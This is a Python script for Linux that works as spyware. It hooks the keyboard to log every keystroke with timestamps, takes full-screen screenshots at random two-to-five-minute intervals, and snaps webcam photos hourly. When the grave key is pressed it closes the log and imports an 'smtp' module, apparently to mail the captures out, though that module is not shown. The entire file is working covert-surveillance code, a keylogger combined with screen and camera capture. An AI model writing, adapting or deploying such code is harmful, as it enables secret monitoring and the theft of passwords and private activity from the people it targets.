#!/usr/bin/python

# import smtp
import pygame
import pygame.camera
import pyxhook
import threading
import gtk.gdk
import time
import random

from multiprocessing import Process

log_file='keythread.txt'#change this to your log file's path
start = 0
flag="single"
file=open(log_file,'a')
file.write("\n --------------NEW--------------\n")
def OnKeyPress(event):			#this function is called everytime a key is pressed.
		global start
		global flag
		if (start == 0):
			file.write("\nTime\t:"+time.strftime('%Y-%m-%d %H:%M:%S')+"\t")
			start = 1

		if  len(event.Key)==1 :
			if flag!="single":
				file.write("\nTime\t:"+time.strftime('%Y-%m-%d %H:%M:%S')+"\t")
			file.write(event.Key)
			flag="single"
		elif event.Ascii== 125:
			file.write("}")
		elif event.Ascii== 123:
			file.write("{")
		elif event.Ascii== 58:
			file.write(":")
		elif event.Ascii== 34:
			file.write("\"")
		elif event.Ascii== 63:
			file.write("?")
		elif event.Ascii== 62:
			file.write(">")
		elif event.Ascii== 124:
			file.write("|")
		elif event.Ascii== 38:
			file.write("&")
		elif event.Ascii== 33:
			file.write("!")
		elif event.Ascii== 36:
			file.write("$")
		elif event.Ascii== 94:
			file.write("^")
		elif event.Ascii== 46:
			file.write(".")
		elif event.Ascii== 47:
			file.write("/")
		elif event.Ascii== 44:
			file.write(",")
		elif event.Ascii== 41:
			file.write(")")
		elif event.Ascii== 40:
			file.write("(")
		elif event.Ascii== 95:
			file.write("_")
		elif event.Ascii== 39:
			file.write("'")
		elif event.Ascii== 59:
			file.write(";")
		elif event.Ascii== 42:
			file.write("*")
		elif event.Ascii== 43:
			file.write("+")
		elif event.Ascii== 93:
			file.write("]")
		elif str(event.Key) == 'at' or event.Ascii== 64:
			file.write("@")
		elif str(event.Key) == 'percent' or event.Ascii== 37:
			file.write("%")
		elif str(event.Key) == 'ambersand' or event.Ascii== 38:
			file.write("&")
		elif str(event.Key) == 'number' or event.Ascii== 35:
			file.write("#")
		elif str(event.Key) == 'P_End' and event.Ascii== 0:
			file.write("1")
		elif str(event.Key) == 'P_Down' and event.Ascii== 0:
			file.write("2")
		elif str(event.Key) == 'P_Next' and event.Ascii== 0:
			file.write("3")
		elif str(event.Key) == 'P_Left' and event.Ascii== 0:
			file.write("4")
		elif str(event.Key) == 'P_Begin' and event.Ascii== 0:
			file.write("5")
		elif str(event.Key) == 'P_Right' and event.Ascii== 0:
			file.write("6")
		elif str(event.Key) == 'P_Home' and event.Ascii== 0:
			file.write("7")
		elif str(event.Key) == 'P_Up' and event.Ascii== 0:
			file.write("8")
		elif str(event.Key) == 'P_Page_Up' and event.Ascii== 0:
			file.write("9")
		elif str(event.Key) == 'P_Subtract' and event.Ascii== 0:
			file.write("-")
		elif str(event.Key) == 'P_Add' and event.Ascii== 0:
			file.write("+")
		elif str(event.Key) == 'P_Divide' and event.Ascii== 0:
			file.write("/")
		elif str(event.Key) == 'P_Multiply' and event.Ascii== 0:
			file.write("*")

		else:
			if str(event.Key) == 'space' or event.Ascii == 32:
			 	file.write(" ")
			elif event.Ascii == 0 and (str(event.Key) == 'Return' or str(event.Key)=='P_Enter'):
			 	file.write("\nTime\t:"+time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+"<--Enter-->")
			elif event.Ascii == 0 and( str(event.Key) == 'Alt_LTab' or str(event.Key) == 'Alt_RTab'):
			 	file.write("\nTime\t:"+time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+"<--Windows Changed-->")
			else:
				file.write("\nTime\t:"+time.strftime('%Y-%m-%d %H:%M:%S')+"\t"+event.Key)
				flag="multiple"


		if event.Ascii==96: 							#96 is the ascii value of the grave key (`)

			file.write("\n ----------------END OF LOG---------------")
			file.close()
			new_hook.cancel()
			screen.terminate()
			camera.terminate()
			import smtp


		# if (event.Ascii > 96 or event.Ascii < 123 or event.Ascii > 64 or event.Ascii < 91 or event.Ascii

def screenshot():
	while 1 :
		print("the thread has started")
		# generate a random time between 120 and 300 sec
		random_time = random.randrange(120,300)

		# wait between 120 and 300 seconds (or between 2 and 5 minutes)
		print "Next picture in: %.2f minutes" % (float(random_time) / 60)
		time.sleep(random_time)

		w = gtk.gdk.get_default_root_window()
		sz = w.get_size()
		print "The size of the window is %d x %d" % sz
		pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
		pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])

		ts =time.strftime("%Y-%m-%d %H:%M:%S")
		filename = "screenshot"
		filename +=ts
		filename += ".png"

		if (pb != None):
			pb.save(filename,"png")
			print "Screenshot saved to "+filename
		else:
			print "Unable to get the screenshot."


def picture():
	while 1:
		cam.start()
		img = cam.get_image()
		ts =time.strftime("%Y-%m-%d %H:%M:%S")
		filename = "pic"
		filename +=ts
		filename += ".jpg"
		pygame.image.save(img,filename)
		time.sleep(3600)


new_hook=pyxhook.HookManager()							#instantiate HookManager class
new_hook.KeyDown=OnKeyPress								#listen to all keystrokes
new_hook.HookKeyboard()									#Hook the keyboard
new_hook.start()										#Start the session
screen=Process(target=screenshot)
screen.start()
pygame.camera.init()
pygame.camera.list_cameras() 							#Camera detected or not
cam = pygame.camera.Camera("/dev/video0",(640,480))
camera=Process(target=picture)
camera.start()